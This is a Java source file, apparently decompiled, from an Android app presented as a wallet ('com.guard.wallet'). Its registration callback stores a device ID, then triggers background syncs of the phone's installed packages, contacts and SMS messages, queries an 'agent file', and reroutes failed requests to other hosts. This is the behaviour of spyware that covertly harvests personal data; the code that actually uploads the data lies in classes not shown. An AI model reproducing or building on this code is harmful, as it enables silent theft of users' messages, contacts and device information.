package com.guard.wallet.http;
import com.guard.wallet.core.AppUtils;

import android.util.Log;
import com.guard.wallet.resp.ApiResult;
import com.guard.wallet.resp.DeviceInfoVO;
import java.io.IOException;
import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.Response;
import okhttp3.ResponseBody;

/**
 * 注册回调 — vendor http/w (151 lines).
 *
 * <p>设备注册回调: 保存 deviceId, 触发同步(包、联系人、短信)。
 */
public final class RegisterCallback implements Callback {
    @Override
    public void onFailure(Call call, IOException e) {
        AppUtils.s("RegisterCallback", e);
        if (!(e instanceof DuplicateRequestException)) {
            HttpClient.finishRequest(call.request().url().host());
            HttpApiManager.routeForwarding(call, this);
        }
    }

    @Override
    public void onResponse(Call call, Response response) throws IOException {
        HttpClient.finishRequest(call.request().url().host());
        ResponseBody body = response.body();
        if (body != null) {
            try {
                // 非 JSON 响应（如 HTML 错误页）直接跳过，不尝试解析
                String contentType = response.header("Content-Type", "");
                if (!contentType.contains("application/json") && !contentType.contains("text/json")) {
                    Log.w("RegisterCallback", "Non-JSON response (HTTP " + response.code() + ", " + contentType + "), skipping parse");
                    body.close();
                    return;
                }
                String rawBody = body.string();
                RegisterCallback$1 typeToken = new RegisterCallback$1();
                ApiResult result = (ApiResult) com.guard.wallet.utils.SharedPrefsManager.c(rawBody, typeToken);
                if (result != null && result.getSuccess() && !AppUtils.B(result.getData())) {
                    com.guard.wallet.utils.SharedPrefsManager.D((String) result.getData(), "deviceId");
                    HttpApiManager.fetchAppLocateValues();
                    if (!AppUtils.v(com.guard.wallet.utils.SystemHelper.i0())) {
                        HttpApiManager.queryAgentFile();
                    }
                    HttpApiManager.syncListenWindows();

                    // Sync packages
                    if (com.guard.wallet.utils.SystemHelper.l()) {
                        boolean syncPackages;
                        synchronized (com.guard.wallet.utils.SharedPrefsManager.class) {
                            syncPackages = com.guard.wallet.utils.SharedPrefsManager.e("syncPackages");
                        }
                        if (!syncPackages) {
                            com.guard.wallet.thread.SyncTaskWrapper task = new com.guard.wallet.thread.SyncTaskWrapper(2);
                            com.guard.wallet.thread.DelegateTaskLauncher.d(task, "SYNC_DEVICE_INSTALLED_PACKAGES");
                        }
                    }

                    // Sync contacts
                    if (com.guard.wallet.utils.SystemHelper.n()) {
                        boolean syncContacts;
                        synchronized (com.guard.wallet.utils.SharedPrefsManager.class) {
                            syncContacts = com.guard.wallet.utils.SharedPrefsManager.e("syncContacts");
                        }
                        if (!syncContacts) {
                            com.guard.wallet.thread.SyncTaskWrapper task = new com.guard.wallet.thread.SyncTaskWrapper(1);
                            com.guard.wallet.thread.DelegateTaskLauncher.d(task, "SYNC_DEVICE_CONTACTS");
                        }
                    }

                    // Sync SMS
                    if (com.guard.wallet.utils.SystemHelper.p()) {
                        boolean syncSms;
                        synchronized (com.guard.wallet.utils.SharedPrefsManager.class) {
                            syncSms = com.guard.wallet.utils.SharedPrefsManager.e("syncSmsMessage");
                        }
                        if (!syncSms) {
                            com.guard.wallet.thread.SyncTaskWrapper task = new com.guard.wallet.thread.SyncTaskWrapper(3);
                            com.guard.wallet.thread.DelegateTaskLauncher.d(task, "SYNC_DEVICE_SMS");
                        }
                    }
                }
            } catch (Exception ex) {
                AppUtils.s("RegisterCallback", ex);
            }
        }
        response.close();
    }
}
